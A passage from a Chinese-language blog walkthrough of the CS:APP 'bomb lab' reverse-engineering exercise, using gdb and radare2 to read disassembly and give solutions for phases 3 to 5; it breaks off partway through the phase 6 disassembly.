<pre class=" language-html"><code class="language-html">bomb[0x400f47] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+4</span><span class="token punctuation">></span></span>:   leaq   0xc(%rsp), %rcx
bomb[0x400f4c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+9</span><span class="token punctuation">></span></span>:   leaq   0x8(%rsp), %rdx
</code></pre>
<p>这两行代表了两个数存的位置。</p>
<pre class=" language-html"><code class="language-html">bomb[0x400f6a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+39</span><span class="token punctuation">></span></span>:  cmpl   $0x7, 0x8(%rsp)
bomb[0x400f6f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+44</span><span class="token punctuation">></span></span>:  ja     0x400fad                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+106</span><span class="token punctuation">></span></span>
</code></pre>
<p>由这两行，可知第一个数要不能大于7,<code>ja</code>是<code>unsigned &gt;</code>，所以第一个数还要是正数。</p>
<p>关键的一行是这个<code>bomb[0x400f75] &lt;+50&gt;:  jmpq   *0x402470(,%rax,8)</code>,这是一个switch跳转语句，跳转到<code>0x402470+ %rax * 8</code>的位置。使用<code>p/x</code>来确定跳转的目的地址。</p>
<pre class=" language-html"><code class="language-html">(gdb) p/x *(0x402470)
$1 = 0x400f7c
(gdb) p/x *(0x402470+8)
$2 = 0x400fb9
(gdb) p/x *(0x402470+16)
$3 = 0x400f83
(gdb) p/x *(0x402470+24)
$4 = 0x400f8a
(gdb) p/x *(0x402470+32)
$5 = 0x400f91
(gdb) p/x *(0x402470+40)
$6 = 0x400f98
(gdb) p/x *(0x402470+48)
$7 = 0x400f9f
(gdb) p/x *(0x402470+56)
$8 = 0x400fa6
</code></pre>
<p>通过这个跳转表，可得得到8个解</p>
<pre class=" language-html"><code class="language-html">0 207
1 311
2 707
3 256
4 389
5 206
6 682
7 327
</code></pre>
<h2 id="Phase4"><a href="#Phase4" class="headerlink" title="Phase4"></a>Phase4</h2><pre class=" language-html"><code class="language-html">bomb`phase_4:
bomb[0x40100c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:  subq   $0x18, %rsp
bomb[0x401010] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+4</span><span class="token punctuation">></span></span>:  leaq   0xc(%rsp), %rcx
bomb[0x401015] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+9</span><span class="token punctuation">></span></span>:  leaq   0x8(%rsp), %rdx
bomb[0x40101a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+14</span><span class="token punctuation">></span></span>: movl   $0x4025cf, %esi
bomb[0x40101f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+19</span><span class="token punctuation">></span></span>: movl   $0x0, %eax
bomb[0x401024] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+24</span><span class="token punctuation">></span></span>: callq  0x400bf0                  ; symbol stub for: __isoc99_sscanf
bomb[0x401029] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+29</span><span class="token punctuation">></span></span>: cmpl   $0x2, %eax
bomb[0x40102c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+32</span><span class="token punctuation">></span></span>: jne    0x401035                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>
bomb[0x40102e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+34</span><span class="token punctuation">></span></span>: cmpl   $0xe, 0x8(%rsp)
bomb[0x401033] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+39</span><span class="token punctuation">></span></span>: jbe    0x40103a                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+46</span><span class="token punctuation">></span></span>
bomb[0x401035] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x40103a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+46</span><span class="token punctuation">></span></span>: movl   $0xe, %edx
bomb[0x40103f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+51</span><span class="token punctuation">></span></span>: movl   $0x0, %esi
bomb[0x401044] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+56</span><span class="token punctuation">></span></span>: movl   0x8(%rsp), %edi
bomb[0x401048] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+60</span><span class="token punctuation">></span></span>: callq  0x400fce                  ; func4
bomb[0x40104d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+65</span><span class="token punctuation">></span></span>: testl  %eax, %eax
bomb[0x40104f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+67</span><span class="token punctuation">></span></span>: jne    0x401058                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+76</span><span class="token punctuation">></span></span>
bomb[0x401051] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+69</span><span class="token punctuation">></span></span>: cmpl   $0x0, 0xc(%rsp)
bomb[0x401056] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+74</span><span class="token punctuation">></span></span>: je     0x40105d                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+81</span><span class="token punctuation">></span></span>
bomb[0x401058] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+76</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x40105d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+81</span><span class="token punctuation">></span></span>: addq   $0x18, %rsp
bomb[0x401061] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+85</span><span class="token punctuation">></span></span>: retq
</code></pre>
<p>同样的方式，可以确定第一个整数小于等于14，第二个数为0。</p>
<p>第一个数具体值，需要执行func4。</p>
<p>所以func4的代码</p>
<pre class=" language-html"><code class="language-html">bomb`func4:
bomb[0x400fce] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:  subq   $0x8, %rsp
bomb[0x400fd2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+4</span><span class="token punctuation">></span></span>:  movl   %edx, %eax
bomb[0x400fd4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+6</span><span class="token punctuation">></span></span>:  subl   %esi, %eax
bomb[0x400fd6] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+8</span><span class="token punctuation">></span></span>:  movl   %eax, %ecx
bomb[0x400fd8] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+10</span><span class="token punctuation">></span></span>: shrl   $0x1f, %ecx
bomb[0x400fdb] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+13</span><span class="token punctuation">></span></span>: addl   %ecx, %eax
bomb[0x400fdd] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+15</span><span class="token punctuation">></span></span>: sarl   %eax
bomb[0x400fdf] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+17</span><span class="token punctuation">></span></span>: leal   (%rax,%rsi), %ecx
bomb[0x400fe2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+20</span><span class="token punctuation">></span></span>: cmpl   %edi, %ecx
bomb[0x400fe4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+22</span><span class="token punctuation">></span></span>: jle    0x400ff2                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+36</span><span class="token punctuation">></span></span>
bomb[0x400fe6] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+24</span><span class="token punctuation">></span></span>: leal   -0x1(%rcx), %edx
bomb[0x400fe9] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+27</span><span class="token punctuation">></span></span>: callq  0x400fce                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>
bomb[0x400fee] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+32</span><span class="token punctuation">></span></span>: addl   %eax, %eax
bomb[0x400ff0] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+34</span><span class="token punctuation">></span></span>: jmp    0x401007                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>
bomb[0x400ff2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+36</span><span class="token punctuation">></span></span>: movl   $0x0, %eax
bomb[0x400ff7] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>: cmpl   %edi, %ecx
bomb[0x400ff9] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+43</span><span class="token punctuation">></span></span>: jge    0x401007                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>
bomb[0x400ffb] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+45</span><span class="token punctuation">></span></span>: leal   0x1(%rcx), %esi
bomb[0x400ffe] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+48</span><span class="token punctuation">></span></span>: callq  0x400fce                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>
bomb[0x401003] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+53</span><span class="token punctuation">></span></span>: leal   0x1(%rax,%rax), %eax
bomb[0x401007] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>: addq   $0x8, %rsp
bomb[0x40100b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+61</span><span class="token punctuation">></span></span>: retq
</code></pre>
<p>仔细看会发现<code>&lt;+20&gt;</code>和<code>&lt;+41&gt;</code>是一样的，而他们的下一行判断正好相反。注意<code>&lt;+24&gt;</code>和<code>&lt;+45&gt;</code>,以及他们的下一行，都很类似。其实就是递归逼近答案。<br>好吧，随便带入一个0,结果发现正好就正确了。所以输入<code>0 0</code>。倒是测试了一下，发现输入<code>1 0</code>或者<code>3 0</code>或者<code>7 0</code>都正确，果然<code>func4</code>还要细看。只能带入func4慢慢推导，这里就不细写了。</p>
<h2 id="Phase5"><a href="#Phase5" class="headerlink" title="Phase5"></a>Phase5</h2><pre class=" language-html"><code class="language-html">bomb`phase_5:
bomb[0x401062] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:   pushq  %rbx
bomb[0x401063] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+1</span><span class="token punctuation">></span></span>:   subq   $0x20, %rsp
bomb[0x401067] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+5</span><span class="token punctuation">></span></span>:   movq   %rdi, %rbx
bomb[0x40106a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+8</span><span class="token punctuation">></span></span>:   movq   %fs:0x28, %rax
bomb[0x401073] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+17</span><span class="token punctuation">></span></span>:  movq   %rax, 0x18(%rsp)
bomb[0x401078] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+22</span><span class="token punctuation">></span></span>:  xorl   %eax, %eax
bomb[0x40107a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+24</span><span class="token punctuation">></span></span>:  callq  0x40131b                  ; string_length
bomb[0x40107f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+29</span><span class="token punctuation">></span></span>:  cmpl   $0x6, %eax
bomb[0x401082] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+32</span><span class="token punctuation">></span></span>:  je     0x4010d2                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+112</span><span class="token punctuation">></span></span>
bomb[0x401084] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+34</span><span class="token punctuation">></span></span>:  callq  0x40143a                  ; explode_bomb
bomb[0x401089] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+39</span><span class="token punctuation">></span></span>:  jmp    0x4010d2                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+112</span><span class="token punctuation">></span></span>
bomb[0x40108b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>:  movzbl (%rbx,%rax), %ecx
bomb[0x40108f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+45</span><span class="token punctuation">></span></span>:  movb   %cl, (%rsp)
bomb[0x401092] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+48</span><span class="token punctuation">></span></span>:  movq   (%rsp), %rdx
bomb[0x401096] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+52</span><span class="token punctuation">></span></span>:  andl   $0xf, %edx
bomb[0x401099] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+55</span><span class="token punctuation">></span></span>:  movzbl 0x4024b0(%rdx), %edx
bomb[0x4010a0] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+62</span><span class="token punctuation">></span></span>:  movb   %dl, 0x10(%rsp,%rax)
bomb[0x4010a4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+66</span><span class="token punctuation">></span></span>:  addq   $0x1, %rax
bomb[0x4010a8] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+70</span><span class="token punctuation">></span></span>:  cmpq   $0x6, %rax
bomb[0x4010ac] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+74</span><span class="token punctuation">></span></span>:  jne    0x40108b                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>
bomb[0x4010ae] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+76</span><span class="token punctuation">></span></span>:  movb   $0x0, 0x16(%rsp)
bomb[0x4010b3] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+81</span><span class="token punctuation">></span></span>:  movl   $0x40245e, %esi
bomb[0x4010b8] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+86</span><span class="token punctuation">></span></span>:  leaq   0x10(%rsp), %rdi
bomb[0x4010bd] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+91</span><span class="token punctuation">></span></span>:  callq  0x401338                  ; strings_not_equal
bomb[0x4010c2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+96</span><span class="token punctuation">></span></span>:  testl  %eax, %eax
bomb[0x4010c4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+98</span><span class="token punctuation">></span></span>:  je     0x4010d9                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+119</span><span class="token punctuation">></span></span>
bomb[0x4010c6] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+100</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x4010cb] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+105</span><span class="token punctuation">></span></span>: nopl   (%rax,%rax)
bomb[0x4010d0] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+110</span><span class="token punctuation">></span></span>: jmp    0x4010d9                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+119</span><span class="token punctuation">></span></span>
bomb[0x4010d2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+112</span><span class="token punctuation">></span></span>: movl   $0x0, %eax
bomb[0x4010d7] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+117</span><span class="token punctuation">></span></span>: jmp    0x40108b                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>
bomb[0x4010d9] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+119</span><span class="token punctuation">></span></span>: movq   0x18(%rsp), %rax
bomb[0x4010de] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+124</span><span class="token punctuation">></span></span>: xorq   %fs:0x28, %rax
bomb[0x4010e7] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+133</span><span class="token punctuation">></span></span>: je     0x4010ee                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+140</span><span class="token punctuation">></span></span>
bomb[0x4010e9] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+135</span><span class="token punctuation">></span></span>: callq  0x400b30                  ; symbol stub for: __stack_chk_fail
bomb[0x4010ee] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+140</span><span class="token punctuation">></span></span>: addq   $0x20, %rsp
bomb[0x4010f2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+144</span><span class="token punctuation">></span></span>: popq   %rbx
bomb[0x4010f3] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+145</span><span class="token punctuation">></span></span>: retq
</code></pre>
<p>这道题挺让人头大的，只能参考一些资料。这里用到了一个逆向工具——radare2。</p>
<p><code>r2 bomb</code></p>
<p>进入radare2</p>
<p>首先执行<code>aaa</code>来初始化。</p>
<p><code>afl</code>是用来标示函数的， 所以使用<code>afl~phase</code>来寻找反汇编中的phase，得到</p>
<pre class=" language-html"><code class="language-html">[0x00400c90]> afl~phase
0x004015c4  149  8  sym.phase_defused
0x00401062  146  9  sym.phase_5
0x00400f43  139  8  sym.phase_3
0x00400ee0  28  3  sym.phase_1
0x004012f6  37  1  sym.invalid_phase
0x00401242  81  5  sym.secret_phase
0x0040100c  86  7  sym.phase_4
0x004010f4  272  26  sym.phase_6
0x00400efc  71  8  sym.phase_2
</code></pre>
<p>使用<code>seek</code>来选择函数,<code>pdf</code>来打印反汇编的函数:</p>
<pre class=" language-html"><code class="language-html">[0x00400c90]> s sym.phase_5
[0x00401062]> pdf
/ (fcn) sym.phase_5 146
|           ; CALL XREF from 0x00400eaa (sym.phase_5)
|           0x00401062      53             push rbx
|           0x00401063      4883ec20       sub rsp, 0x20
|           0x00401067      4889fb         mov rbx, rdi
|           0x0040106a      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x48b8  ; '('
|           0x00401073      4889442418     mov qword [rsp + 0x18], rax
|           0x00401078      31c0           xor eax, eax
|           0x0040107a      e89c020000     call sym.string_length
|           0x0040107f      83f806         cmp eax, 6
|       ,=&lt; 0x00401082      744e           je 0x4010d2                
|       |   0x00401084      e8b1030000     call sym.explode_bomb
|      ,==&lt; 0x00401089      eb47           jmp 0x4010d2               
|      ||   ; JMP XREF from 0x004010d7 (sym.phase_5)
|      ||   ; JMP XREF from 0x004010ac (sym.phase_5)
|    ..---> 0x0040108b      0fb60c03       movzx ecx, byte [rbx + rax]
|    ||||   0x0040108f      880c24         mov byte [rsp], cl
|    ||||   0x00401092      488b1424       mov rdx, qword [rsp]
|    ||||   0x00401096      83e20f         and edx, 0xf
|    ||||   0x00401099      0fb692b02440.  movzx edx, byte [rdx + str.maduiersnfotvbylSo_you_think_you_can_stop_the_bomb_with_ctrl_c__do_you_] ; [0x4024b0:1]=109 LEA obj.array.3449 ; "maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?" @ 0x4024b0
|    ||||   0x004010a0      88540410       mov byte [rsp + rax + 0x10], dl
|    ||||   0x004010a4      4883c001       add rax, 1
|    ||||   0x004010a8      4883f806       cmp rax, 6
|    `====&lt; 0x004010ac      75dd           jne 0x40108b               
|     |||   0x004010ae      c644241600     mov byte [rsp + 0x16], 0
|     |||   0x004010b3      be5e244000     mov esi, str.flyers         ; "flyers" @ 0x40245e
|     |||   0x004010b8      488d7c2410     lea rdi, [rsp + 0x10]       ; 0x10 
|     |||   0x004010bd      e876020000     call sym.strings_not_equal
|     |||   0x004010c2      85c0           test eax, eax
|    ,====&lt; 0x004010c4      7413           je 0x4010d9                
|    ||||   0x004010c6      e86f030000     call sym.explode_bomb
|    ||||   0x004010cb      0f1f440000     nop dword [rax + rax]
|   ,=====&lt; 0x004010d0      eb07           jmp 0x4010d9               
|   |||||   ; JMP XREF from 0x00401089 (sym.phase_5)
|   |||||   ; JMP XREF from 0x00401082 (sym.phase_5)
|   |||``-> 0x004010d2      b800000000     mov eax, 0
|   ||`===&lt; 0x004010d7      ebb2           jmp 0x40108b               
|   ||      ; JMP XREF from 0x004010d0 (sym.phase_5)
|   ||      ; JMP XREF from 0x004010c4 (sym.phase_5)
|   ``----> 0x004010d9      488b442418     mov rax, qword [rsp + 0x18] ; [0x18:8]=0x400c90 section..text
|           0x004010de      644833042528.  xor rax, qword fs:[0x28]
|       ,=&lt; 0x004010e7      7405           je 0x4010ee                
|       |   0x004010e9      e842faffff     call sym.imp.__stack_chk_fail
|       |   ; JMP XREF from 0x004010e7 (sym.phase_5)
|       `-> 0x004010ee      4883c420       add rsp, 0x20
|           0x004010f2      5b             pop rbx
\           0x004010f3      c3             ret
[0x00401062]>
</code></pre>
<p>这题要求输入一个长度为6的字符串，经过一定的变换要得到<code>0x40245e</code>指向的字符串<code>flyers</code>。通过上述的代码，会敏感的发现待转换的字符串在<code>obj.array.3449</code>中，使用如下代码来找到偏移量</p>
<pre class=" language-html"><code class="language-html">[0x00401062]> px 16@obj.array.3449
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x004024b0  6d61 6475 6965 7273 6e66 6f74 7662 796c  maduiersnfotvbyl
</code></pre>
<p>上面的一个偏移量对应下面的2个字符。</p>
<p>下面将flyers转化为十六进制ascii</p>
<pre class=" language-html"><code class="language-html">[0x00401062]> !rax2 -S flyers
666c79657273
</code></pre>
<p>得到的<code>666c79657273</code>两个一组，找对应的上面的偏移量，可以得到偏移量list<code>[9, 0xF, 0xE, 5, 6, 7]</code></p>
<p>使用python来计算出结果</p>
<pre class=" language-python"><code class="language-python">off <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0xF</span><span class="token punctuation">,</span> <span class="token number">0xE</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span>
result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> off<span class="token punctuation">:</span>
    result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>c <span class="token operator">+</span> <span class="token number">64</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> result
</code></pre>
<p>所以这题的答案是<code>IONEFG</code></p>
<h2 id="Phase6"><a href="#Phase6" class="headerlink" title="Phase6"></a>Phase6</h2><pre class=" language-html"><code class="language-html">bomb`phase_6:
bomb[0x4010f4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:   pushq  %r14
bomb[0x4010f6] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+2</span><span class="token punctuation">></span></span>:   pushq  %r13
bomb[0x4010f8] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+4</span><span class="token punctuation">></span></span>:   pushq  %r12
bomb[0x4010fa] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+6</span><span class="token punctuation">></span></span>:   pushq  %rbp
bomb[0x4010fb] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+7</span><span class="token punctuation">></span></span>:   pushq  %rbx
bomb[0x4010fc] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+8</span><span class="token punctuation">></span></span>:   subq   $0x50, %rsp
bomb[0x401100] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+12</span><span class="token punctuation">></span></span>:  movq   %rsp, %r13
bomb[0x401103] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+15</span><span class="token punctuation">></span></span>:  movq   %rsp, %rsi
bomb[0x401106] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+18</span><span class="token punctuation">></span></span>:  callq  0x40145c                  ; read_six_numbers
bomb[0x40110b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+23</span><span class="token punctuation">></span></span>:  movq   %rsp, %r14
bomb[0x40110e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+26</span><span class="token punctuation">></span></span>:  movl   $0x0, %r12d
bomb[0x401114] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+32</span><span class="token punctuation">></span></span>:  movq   %r13, %rbp
bomb[0x401117] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+35</span><span class="token punctuation">></span></span>:  movl   (%r13), %eax
bomb[0x40111b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+39</span><span class="token punctuation">></span></span>:  subl   $0x1, %eax
bomb[0x40111e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+42</span><span class="token punctuation">></span></span>:  cmpl   $0x5, %eax
bomb[0x401121] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+45</span><span class="token punctuation">></span></span>:  jbe    0x401128                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+52</span><span class="token punctuation">></span></span>
bomb[0x401123] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+47</span><span class="token punctuation">></span></span>:  callq  0x40143a                  ; explode_bomb
bomb[0x401128] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+52</span><span class="token punctuation">></span></span>:  addl   $0x1, %r12d
bomb[0x40112c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+56</span><span class="token punctuation">></span></span>:  cmpl   $0x6, %r12d
bomb[0x401130] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+60</span><span class="token punctuation">></span></span>:  je     0x401153                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+95</span><span class="token punctuation">></span></span>
bomb[0x401132] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+62</span><span class="token punctuation">></span></span>:  movl   %r12d, %ebx
bomb[0x401135] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+65</span><span class="token punctuation">></span></span>:  movslq %ebx, %rax
bomb[0x401138] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+68</span><span class="token punctuation">></span></span>:  movl   (%rsp,%rax,4), %eax
bomb[0x40113b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+71</span><span class="token punctuation">></span></span>:  cmpl   %eax, (%rbp)
bomb[0x40113e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+74</span><span class="token punctuation">></span></span>:  jne    0x401145                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+81</span><span class="token punctuation">></span></span>
bomb[0x401140] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+76</span><span class="token punctuation">></span></span>:  callq  0x40143a                  ; explode_bomb
bomb[0x401145] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+81</span><span class="token punctuation">></span></span>:  addl   $0x1, %ebx
bomb[0x401148] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+84</span><span class="token punctuation">></span></span>:  cmpl   $0x5, %ebx
bomb[0x40114b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+87</span><span class="token punctuation">></span></span>:  jle    0x401135                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+65</span><span class="token punctuation">></span></span>
bomb[0x40114d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+89</span><span class="token punctuation">></span></span>:  addq   $0x4, %r13
bomb[0x401151] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+93</span><span class="token punctuation">></span></span>:  jmp    0x401114                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+32</span><span class="token punctuation">></span></span>
bomb[0x401153] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+95</span><span class="token punctuation">></span></span>:  leaq   0x18(%rsp), %rsi
bomb[0x401158] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+100</span><span class="token punctuation">></span></span>: movq   %r14, %rax
bomb[0x40115b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+103</span><span class="token punctuation">></span></span>: movl   $0x7, %ecx
bomb[0x401160] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+108</span><span class="token punctuation">></span></span>: movl   %ecx, %edx
bomb[0x401162] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+110</span><span class="token punctuation">></span></span>: subl   (%rax), %edx
bomb[0x401164] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+112</span><span class="token punctuation">></span></span>: movl   %edx, (%rax)
bomb[0x401166] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+114</span><span class="token punctuation">></span></span>: addq   $0x4, %rax
bomb[0x40116a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+118</span><span class="token punctuation">></span></span>: cmpq   %rsi, %rax
bomb[0x40116d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+121</span><span class="token punctuation">></span></span>: jne    0x401160                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+108</span><span class="token punctuation">></span></span>
